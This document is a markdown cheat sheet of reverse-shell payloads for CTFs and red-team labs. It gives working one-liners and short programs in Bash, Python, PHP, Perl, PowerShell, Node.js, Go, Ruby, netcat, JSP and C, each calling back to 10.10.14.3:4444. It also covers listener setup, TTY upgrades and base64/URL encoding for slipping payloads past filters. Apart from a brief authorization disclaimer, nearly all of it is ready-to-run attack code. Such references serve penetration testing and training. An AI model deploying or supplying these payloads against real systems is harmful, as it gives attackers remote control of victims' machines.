---
icon: square-terminal
---

# Reverse Shells (All)

## **Reverse Shells (All Languages) — Payload Arsenal for CTFs & Red Team Labs**

> ⚠️ Authorized labs and CTFs only. Reverse shells give remote interactive access — never deploy them on real or unapproved targets.\
> Always get **explicit written authorization** before running any payload.

***

### I. 🧩 Concept Refresher

| Term              | Meaning                                                             |
| ----------------- | ------------------------------------------------------------------- |
| **Reverse Shell** | Target connects back to your listener (bypasses inbound firewall).  |
| **Bind Shell**    | Target listens; you connect to it.                                  |
| **Listener**      | Your receiving endpoint (e.g., `nc -lvnp 4444`).                    |
| **TTY Upgrade**   | Converts a raw shell to interactive (Ctrl+C, tab completion, etc.). |

***

### II. 🧠 Universal Listener Setup

```bash
# Netcat
nc -lvnp 4444

# Ncat (Windows-friendly)
ncat -lnvp 4444

# Metasploit multi/handler
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST <ip>
set LPORT 4444
run
```

***

### III. 🐚 Bash Reverse Shells

#### 🔹 Classic Bash

```bash
bash -i >& /dev/tcp/10.10.14.3/4444 0>&1
```

#### 🔹 Encoded Inline (for injection)

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'
```

#### 🔹 Using `exec`

```bash
exec 5<>/dev/tcp/10.10.14.3/4444;cat <&5 | while read line; do $line 2>&5 >&5; done
```

#### 🔹 BusyBox Compatible

```bash
busybox nc 10.10.14.3 4444 -e /bin/sh
```

***

### IV. 🐍 Python Reverse Shells

#### 🔹 Simple TCP

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.3",4444));[os.dup2(s.fileno(),fd) for fd in(0,1,2)];pty.spawn("/bin/bash")'
```

#### 🔹 Python2 Compatible

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

***

### V. 🧠 PHP Reverse Shells

#### 🔹 One-Liner

```php
php -r '$sock=fsockopen("10.10.14.3",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### 🔹 Web Payload (for web shells)

```php
<?php
$s=fsockopen("10.10.14.3",4444);
shell_exec("/bin/bash -i <&3 >&3 2>&3");
?>
```

***

### VI. ⚙️ Perl Reverse Shells

#### 🔹 Classic

```bash
perl -e 'use Socket;$i="10.10.14.3";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

***

### VII. 🧰 PowerShell Reverse Shells (Windows)

#### 🔹 Basic TCP Reverse Shell

```powershell
powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.3',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

#### 🔹 Short Encoded

```powershell
powershell -EncodedCommand <base64>
```

Encode with:

```bash
echo -n "payload" | iconv -t UTF-16LE | base64 -w 0
```

***

### VIII. 🧠 Node.js Reverse Shell

```bash
node -e "const net=require('net'),cp=require('child_process');const s=net.connect(4444,'10.10.14.3');s.on('connect',()=>{cp.spawn('/bin/sh',[],{stdio:[s,s,s]})});"
```

***

### IX. ⚙️ Go Reverse Shell

```go
package main
import("net";"os/exec")
func main(){
 c,_:=net.Dial("tcp","10.10.14.3:4444")
 cmd:=exec.Command("/bin/sh")
 cmd.Stdin,cmd.Stdout,cmd.Stderr=c,c,c
 cmd.Run()
}
```

Compile:

```bash
GOOS=linux GOARCH=amd64 go build shell.go
```

***

### X. 🧠 Ruby Reverse Shell

```bash
ruby -rsocket -e'f=TCPSocket.open("10.10.14.3",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

***

### XI. ⚙️ Netcat Reverse Shells

#### 🔹 Traditional

```bash
nc -e /bin/sh 10.10.14.3 4444
```

#### 🔹 Without `-e`

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.3 4444 >/tmp/f
```

#### 🔹 Ncat (Encrypted)

```bash
ncat --ssl 10.10.14.3 4444 -e /bin/bash
```

***

### XII. 🧱 Java Reverse Shell (JSP Payload)

```java
<%@ page import="java.io.*,java.net.*"%>
<%
String host="10.10.14.3";
int port=4444;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(), so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();
  Thread.sleep(50);
  try { p.exitValue(); break; } catch (Exception e){}
}
p.destroy(); s.close();
%>
```

***

### XIII. 🧠 C Reverse Shell (Compact)

```c
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
int main(){
 int s=socket(AF_INET,SOCK_STREAM,0);
 struct sockaddr_in sa; sa.sin_family=AF_INET; sa.sin_port=htons(4444);
 sa.sin_addr.s_addr=inet_addr("10.10.14.3");
 connect(s,(struct sockaddr *)&sa,sizeof(sa));
 dup2(s,0); dup2(s,1); dup2(s,2);
 execl("/bin/sh","sh",NULL);
}
```

Compile:

```bash
gcc shell.c -o shell
```

***

### XIV. ⚡ Upgrade TTY After Shell

#### 🧠 Linux

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo; fg
reset
```

#### 🧠 Windows (via PowerShell)

```powershell
[Console]::OutputEncoding = [Text.UTF8Encoding]::UTF8
```

***

### XV. 🧱 Obfuscation & Encoding (CTF Practice Only)

```bash
# Base64 encode
echo "bash -i >& /dev/tcp/10.10.14.3/4444 0>&1" | base64

# URL encode (Burp or Python)
python3 -c "import urllib.parse;print(urllib.parse.quote('bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'))"
```

***

### XVI. 🧰 Quick Reference Table

| Language   | Command                                   |
| ---------- | ----------------------------------------- |
| Bash       | `bash -i >& /dev/tcp/IP/PORT 0>&1`        |
| Python     | `python3 -c 'import socket,os,pty;...'`   |
| PHP        | `php -r '$sock=fsockopen("IP",PORT);...'` |
| PowerShell | TCPClient reverse                         |
| Node.js    | `node -e "net.connect(...)"`              |
| Go         | Dial and spawn shell                      |
| Perl       | TCP socket with `/bin/sh`                 |
| Netcat     | `nc -e /bin/sh IP PORT`                   |

***
